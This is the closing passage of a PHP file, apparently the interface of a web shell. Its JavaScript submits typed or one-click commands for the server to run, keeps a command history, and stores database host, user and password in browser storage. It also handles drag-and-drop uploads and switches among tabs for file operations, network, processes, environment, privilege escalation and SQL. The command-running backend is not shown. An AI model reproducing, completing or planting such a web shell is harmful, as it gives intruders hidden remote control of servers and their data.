  if (termInput.value.trim()) {
    cmdHist.push(termInput.value.trim());
    sessionStorage.setItem('cmdHist', JSON.stringify(cmdHist.slice(-100)));
    histIdx = cmdHist.length;
  }
  // native form submit → PHP handles it, result shown on reload
});

// Scroll terminal to bottom on load
termHistory.scrollTop = termHistory.scrollHeight;

function runQuick(cmd) {
  switchTab('terminal');
  termInput.value = cmd;
  document.getElementById('term-form').submit();
}

// ── DB Credentials via localStorage ──────────
const LS_KEY = 'hs4_db_creds';

function loadDbCreds() {
  try {
    const raw = localStorage.getItem(LS_KEY);
    if (!raw) return null;
    return JSON.parse(raw);
  } catch(e) { return null; }
}
function applyDbCreds() {
  const c = loadDbCreds();
  const badge = document.getElementById('db-cred-status');
  if (c && (c.user||c.host)) {
    document.getElementById('f_db_host').value = c.host||'localhost';
    document.getElementById('f_db_user').value = c.user||'';
    document.getElementById('f_db_pass').value = c.pass||'';
    document.getElementById('f_db_name').value = c.name||'';
    badge.textContent = c.user+'@'+(c.name||c.host||'localhost');
    badge.className = 'badge ok';
  } else {
    badge.textContent = 'No credentials';
    badge.className = 'badge err';
  }
}
function openDbModal() {
  const c = loadDbCreds()||{};
  document.getElementById('m_db_host').value = c.host||'localhost';
  document.getElementById('m_db_user').value = c.user||'';
  document.getElementById('m_db_pass').value = c.pass||'';
  document.getElementById('m_db_name').value = c.name||'';
  document.getElementById('db-cred-modal').classList.add('open');
}
function closeDbModal() {
  document.getElementById('db-cred-modal').classList.remove('open');
}
function saveDbCreds() {
  const c = {
    host: document.getElementById('m_db_host').value,
    user: document.getElementById('m_db_user').value,
    pass: document.getElementById('m_db_pass').value,
    name: document.getElementById('m_db_name').value,
  };
  localStorage.setItem(LS_KEY, JSON.stringify(c));
  applyDbCreds();
  closeDbModal();
}
function clearDbCreds() {
  localStorage.removeItem(LS_KEY);
  applyDbCreds();
  closeDbModal();
}

// SQL quick-set
function setSql(q) { document.getElementById('sql_textarea').value = q; }

// Apply on load
applyDbCreds();

// ── Dropzone ─────────────────────────────────
const dz = document.getElementById('dropzone');
dz.addEventListener('dragover', e => { e.preventDefault(); dz.classList.add('over'); });
dz.addEventListener('dragleave', () => dz.classList.remove('over'));
dz.addEventListener('drop', e => {
  e.preventDefault(); dz.classList.remove('over');
  const fi = document.getElementById('upload_file');
  if (e.dataTransfer.files.length) {
    // Create new DataTransfer to assign files to input
    const dt = new DataTransfer();
    dt.items.add(e.dataTransfer.files[0]);
    fi.files = dt.files;
    document.getElementById('upload-form').submit();
  }
});

// ── Auto-switch panel if we have relevant results ──
<?php if($edit_file): ?>
switchTab('fileops');
<?php elseif($net_result): ?>
switchTab('network');
<?php elseif($ps_result): ?>
switchTab('processes');
<?php elseif($env_result): ?>
switchTab('env');
<?php elseif($priv_result): ?>
switchTab('privesc');
<?php elseif($sql_result!==null||$sql_error): ?>
switchTab('database');
<?php elseif($compress_result||$chmod_result||$delete_result||$edit_result): ?>
switchTab('fileops');
<?php endif; ?>

// ── Upload dir mirrors current dir ───────────
document.getElementById('upload_dir').value = <?=json_encode($dir)?>;
</script>
</body>
</html>
